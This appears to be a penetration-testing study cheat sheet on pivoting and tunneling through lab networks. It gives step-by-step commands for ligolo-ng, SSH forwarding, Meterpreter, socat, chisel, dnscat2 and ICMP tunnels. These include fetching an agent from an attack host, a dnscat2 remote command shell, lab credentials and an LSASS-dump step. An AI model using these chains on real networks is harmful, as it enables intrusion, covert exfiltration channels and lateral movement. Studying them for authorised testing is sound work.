# 07 - Pivoting & Tunneling

Primary tool is **ligolo-ng** (full tun interface, native tools, no proxychains). Use the decision table below only when you cannot run a binary on the pivot.

## ligolo-ng — install (proxy + agent)
**IF** you want the primary modern pivot and need the proxy (attack host) + agent (target) →
- [ ] download the v0.8.2 binaries and extract.
```bash
mkdir ~/ligolo-ng && cd ~/ligolo-ng
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip
tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
unzip ligolo-ng_agent_0.8.2_windows_amd64.zip
chmod +x proxy agent
```
WHY: proxy on the attack host + a matching agent per target (OS/arch) gives a full tun interface with native tools.
- [ ] works → create the TUN interface.
- [ ] fails → transfer the agent with any delivery method (serve over HTTP + `wget`).
- [ ] ⏱ 10 min → if you can't run a binary on the pivot, use chisel/socat instead.
→ [[Ligolo-ng|src]]

## ligolo-ng — TUN interface (once per session)
**IF** the proxy is up and you need the OS to route `$SUBNET` into the tunnel →
- [ ] create and bring up the `ligolo` tun device (root).
```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
ip addr show ligolo
```
WHY: the tun device is the OS endpoint that makes internal subnets routable without a proxy.
- [ ] works → start the proxy / connect the agent.
- [ ] fails → add a second interface (`ligolo-double`) for the next network.
- [ ] ⏱ 5 min → must exist before `start --tun ligolo`.
→ [[Ligolo-ng|src]]

## ligolo-ng — start proxy / connect agent / activate session
**IF** you have a foothold and the agent binary ready →
- [ ] start the proxy, deliver+run the agent, then `session` → `start`.
```bash
sudo ./proxy -selfcert
wget http://10.10.15.254:8123/agent
./agent -connect 10.10.15.65:11601 -ignore-cert
C:\Users\mlefay\AppData\Local\Temp\agent.exe -connect 172.16.5.35:11601 -ignore-cert
```
(inside the proxy menu: `session` then `start`, or `start --tun ligolo`)
TYPO: the notes write `./agent -connect <ip-address-of-attack-host>:11601 -ignore cert` — correct to: `-ignore-cert`.
WHY: the proxy hosts a self-signed cert on port 11601; the agent dials home; `session`+`start` binds it to the tun.
- [ ] works → add routes (`autoroute` / `ip route`).
- [ ] fails → bind a specific interface/port with `-laddr 0.0.0.0:11601`.
- [ ] ⏱ 5 min → if the agent won't connect, check the firewall on 11601.
→ [[Ligolo-ng|src]]

## ligolo-ng — routing (autoroute / static route)
**IF** the session is started but the OS still needs a route to `$SUBNET` →
`autoroute` or add a static route manually, then verify.
```bash
sudo ip route addd 172.16.5.0/24 dev ligolo
nmap -Pn -p 22 172.16.119.10
```
(inside the proxy interface: `autoroute`)
TYPO: the notes spell `ip route addd` — correct to: `sudo ip route add 172.16.5.0/24 dev ligolo`.
WHY: the route sends `$SUBNET` traffic into the tunnel; the device must be the matching tun.
- [ ] works → liveness check passes → re-enumerate `$SUBNET`.
- [ ] fails → fall back to manual `sudo ip route add <subnet> dev ligolo` (autoroute off).
- [ ] ⏱ 5 min → if unreachable, re-check that the tun is up.
→ [[Ligolo-ng|src]]

## ligolo-ng — multi-hop (listener + second NIC)
**IF** you pivoted into a host with a second NIC reaching a new `$SUBNET` →
- [ ] add a tun, expose a listener on the current agent, run the next agent against the jump box.
```bash
sudo ip tuntap add user $USER mode tun ligolo-double
sudo ip link set ligolo-double up
listener_add -addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
./agent -connect <ip-address-of-the-previous-jump-box>:11601 -ignore cert
sudo ip route add 172.16.6.0/24 dev ligolo-double
start -tun ligolo-double
```
TYPO: the notes spell `listener_add -adddr ... -tcp` — correct to: `listener_add -addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp`.
TYPO: agent line uses `-ignore cert` — correct to: `-ignore-cert`.
WHY: `listener_add` makes the current agent relay to your proxy (127.0.0.1:11601), so the next agent chains through it.
- [ ] works → route + `start`; then re-enumerate the new segment.
- [ ] fails → for a third hop create `ligolo-triple` and repeat; `listener_list` confirms listeners are active.
- [ ] ⏱ 15 min → `listener_add` must run from the correct pivot host's session.
→ [[Ligolo-ng|src]]

## Decision table — situation → method → command
**IF** ligolo-ng isn't possible (can't run a binary on the pivot) →
- [ ] pick the row matching the constraint.
| Situation | Method | Command |
|---|---|---|
| Windows, no SSH, want SOCKS | plink `-D` (+ Proxifier) | `plink -ssh -D 9050 ubuntu@10.129.15.50` |
| No inbound (outbound-only TCP) | chisel `--reverse` | `sudo ./chisel server --reverse -v -p 1234 --socks5` → `./chisel client -v 10.10.15.176:1234 R:socks` |
| No admin, no SSH, port relay only | socat | `socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80` |
| Only DNS egress allowed | dnscat2 | `sudo ruby dnscat2.rb --dns host=10.10.15.141,port=53,domain=inlanefreight.local --no-cache` |
| Only ICMP/ping allowed | ptunnel-ng then SSH `-D` | `sudo ./ptunnel-ng -r10.129.202.64 -R22` → `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22` → `ssh -D 9050 -p2222 -lubuntu 127.0.0.1` |
| RDP-only (Windows network) | SocksOverRDP + Proxifier | `regsvr32.exe SocksOverRDP-Plugin.dll` → `netstat -antb | findstr 1080` |
| SSH + creds (Linux) | sshuttle / dynamic SF | `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v` / `ssh -D 9050 ubuntu@10.129.202.64` |
| Meterpreter, no SSH | socks_proxy + autoroute | `use auxiliary/server/socks_proxy` (`SRVPORT 9050`, `version 4a`) → `use post/multi/manage/autoroute` |
WHY: each constraint (protocol, direction, available tooling) selects exactly one transport.
- [ ] works → point proxychains at the local SOCKS port (9050 / 1080).
- [ ] fails → combine rows (e.g. ptunnel-ng carrying SSH `-D`).
- [ ] ⏱ 10 min per attempt → if the egress protocol is unknown, try ligolo or chisel first.
→ [[10. Pivoting, Tunneling and Port Forwarding/12. SOCKS5 Tunneling with Chisel|src]] [[10. Pivoting, Tunneling and Port Forwarding/13. ICMP Tunneling with SOCKS|src]] [[10. Pivoting, Tunneling and Port Forwarding/11. DNS Tunneling with Dnscat2|src]]

## SSH family (dynamic / local / remote / sshuttle)
**IF** the foothold has SSH + creds →
- [ ] choose dynamic (whole subnet), local (one service), remote (target can't reach you), or sshuttle.
```bash
ssh -D 9050 ubuntu@10.129.202.64
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```
WHY: `-D` = local SOCKS for proxychains; `-L` = forward local→remote port; `-R` = the pivot listens and forwards back; sshuttle routes a whole subnet with no proxychains.
- [ ] works → `proxychains nmap -v -Pn -sT 172.16.5.19`.
- [ ] fails → only a full TCP connect scan works over proxychains; otherwise use sshuttle.
- [ ] ⏱ 10 min → add `socks4 127.0.0.1 9050` to `/etc/proxychains.conf`.
→ [[10. Pivoting, Tunneling and Port Forwarding/2.Dynamic Port Forwarding with SSH and SOCKS Tunneling|src]] [[10. Pivoting, Tunneling and Port Forwarding/3. Remote or Reverse Port Forwarding with SSH|src]] [[10. Pivoting, Tunneling and Port Forwarding/8. SSH Pivoting with Sshuttle|src]]

## Meterpreter (SOCKS + autoroute / portfwd)
**IF** you have a Meterpreter session and no SSH →
- [ ] start MSF's SOCKS proxy + autoroute, or add a single `portfwd`.
```bash
use auxiliary/server/socks_proxy
use post/multi/manage/autoroute
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```
WHY: `socks_proxy` (v4a) exposes 9050; `autoroute` routes `$SUBNET` through the session; `portfwd` relays one port (`-R` reverses it).
- [ ] works → `proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn`.
- [ ] fails → switch `socks4` → `socks5` in proxychains if the server version differs.
- [ ] ⏱ 10 min → for many ports use SOCKS+proxychains, not one portfwd each.
→ [[10. Pivoting, Tunneling and Port Forwarding/4. Meterpreter Tunneling & Port Forwarding|src]]

## socat relay (reverse + bind)
**IF** the pivot runs socat and you only need a port relay (no SSH) →
- [ ] redirect TCP to a reverse listener, or bridge your inbound to a bind shell.
```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```
WHY: socat listens on the pivot and forwards to your listener (reverse) or to the bind port (bind).
- [ ] works → keep payload `LPORT`, `TCP4-LISTEN` and the forward target consistent.
- [ ] fails → use SSH `-R` remote forwarding instead.
- [ ] ⏱ 10 min → else move to netsh / portfwd.
→ [[10. Pivoting, Tunneling and Port Forwarding/5. Socat Redirection with a Reverse Shell|src]] [[10. Pivoting, Tunneling and Port Forwarding/6. Socat Redirection with a Bind Shell|src]]

## Windows-only: netsh portproxy / plink / SocksOverRDP
**IF** the pivot is Windows with no SSH →
- [ ] use netsh (admin, single port), plink (PuTTY present), or SocksOverRDP (RDP-only network).
```bash
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.19
netsh.exe interface portproxy show v4tov4
plink -ssh -D 9050 ubuntu@10.129.15.50
regsvr32.exe SocksOverRDP-Plugin.dll
netstat -antb | findstr 1080
```
WHY: netsh forwards one inbound port (admin); plink gives Windows an SSH SOCKS proxy; SocksOverRDP carries SOCKS5 over the RDP DVC.
- [ ] works → drive tools via Proxifier at `127.0.0.1:1080` / `9050`.
- [ ] fails → run `SocksOverRDP-Server.exe` as Administrator on the pivot first.
- [ ] ⏱ 10 min → netsh needs admin; for slow multi-RDP, set Experience → Performance → Modem.
→ [[10. Pivoting, Tunneling and Port Forwarding/10. Port Forwarding with Windows Netsh|src]] [[10. Pivoting, Tunneling and Port Forwarding/7. SSH for Windows plink.exe|src]] [[10. Pivoting, Tunneling and Port Forwarding/14. RDP and SOCKS Tunneling with SocksOverRDP|src]]

## chisel (SOCKS5 over HTTP) & rpivot (web server)
**IF** a firewall blocks native TCP (or inbound is blocked) →
- [ ] serve `--socks5` from the pivot (or reverse it), or use rpivot's Python reverse SOCKS.
```bash
./chisel server -v -p 1234 --socks5
./chisel client -v 10.129.202.64:1234 socks
sudo ./chisel server --reverse -v -p 1234 --socks5
./chisel client -v 10.10.15.176:1234 R:socks
python2.7 client.py --server-ip 10.10.15.141 --server-port 9999
```
WHY: chisel tunnels TCP/UDP over HTTP with a local SOCKS port (1080); rpivot's client dials out and the server exposes a SOCKS proxy (9050).
- [ ] works → `proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`.
- [ ] fails → `R:socks` for filtered inbound; rpivot needs Python 2.7 on both ends.
- [ ] ⏱ 10 min → add port 1080 to `/etc/proxychains.conf`.
→ [[10. Pivoting, Tunneling and Port Forwarding/12. SOCKS5 Tunneling with Chisel|src]] [[10. Pivoting, Tunneling and Port Forwarding/9. Web Server Pivoting with Rpivot|src]]

## Protocol-limited egress: DNS (dnscat2) & ICMP (ptunnel-ng)
**IF** normal TCP egress is filtered and only DNS or only ICMP is allowed →
- [ ] tunnel over DNS TXT records, or encapsulate SSH inside ICMP echo.
```bash
sudo ruby dnscat2.rb --dns host=10.10.15.141,port=53,domain=inlanefreight.local --no-cache
Start-Dnscat2 -DNSserver 10.10.15.141 -Domain inlanefreight.local -PreSharedSecret 21126e228d89879bd4c7e3fe05612443 -Exec cmd
sudo ./ptunnel-ng -r10.129.202.64 -R22
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```
WHY: DNS TXT rides past HTTPS-focused inspection; ICMP echo carries an SSH session you then `-D` into a SOCKS pivot.
- [ ] works → `proxychains nmap -sV -sT 172.16.5.19 -p3389`.
- [ ] fails → the server prints the `-PreSharedSecret` the client must supply; domains must match.
- [ ] ⏱ 20 min (ICMP latency) → else accept only what egress allows.
→ [[10. Pivoting, Tunneling and Port Forwarding/11. DNS Tunneling with Dnscat2|src]] [[10. Pivoting, Tunneling and Port Forwarding/13. ICMP Tunneling with SOCKS|src]]

## Pivot → re-enumerate loop
**IF** a tunnel/forward is up and the new `$SUBNET` is reachable →
- [ ] confirm reachability, find live hosts, scan them, hunt creds, then pivot again.
```bash
nmap -Pn -p 22 172.16.119.10
proxychains nmap -v -sn 172.16.5.1-200
proxychains nmap -v -Pn -sT 172.16.5.19
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
rustscan -a 172.16.5.35 --ulimit 10000  -- -A -sC -sV -oA full_port_scan
```
WHY: each tunnel exposes a new segment — re-discover hosts/services and pivot again from any new dual-homed box.
- [ ] works → new host/service → new creds → repeat; feed findings back to [[02 - External Recon & Enumeration]].
- [ ] fails → ping sweeps need a second run (ARP cache); only `-sT` scans work over proxychains.
- [ ] ⏱ 15 min per segment → if no new hosts, stop and loot what you have.
→ [[10. Pivoting, Tunneling and Port Forwarding/Lab|src]]

## Loop-back (new tunnel up → re-enumerate)
**IF** you brought a new tunnel up →
- [ ] do not just scan and stop; re-run the whole enumeration loop on the new segment.
- [ ] Live hosts → nmap/rustscan the new `$SUBNET` (see the loop above).
- [ ] New hosts → [[02 - External Recon & Enumeration]]; new services → [[04 - Credentials & Common Services]] + [[02 - External Recon & Enumeration]].
- [ ] New creds/domain → [[04 - Credentials & Common Services]] + [[08 - Active Directory & Lateral Movement]].
- [ ] New dual-homed host → deploy a fresh ligolo agent (or `ligolo-triple`) and repeat.
- [ ] Windows-only segment → RDP + SocksOverRDP → LSASS dump → reuse creds for the next hop.
- [ ] ⏱ Every tunnel is a new enumeration start; expect 2–3 hops to the DC.
→ [[10. Pivoting, Tunneling and Port Forwarding/Lab|src]] [[Ligolo-ng|src]]
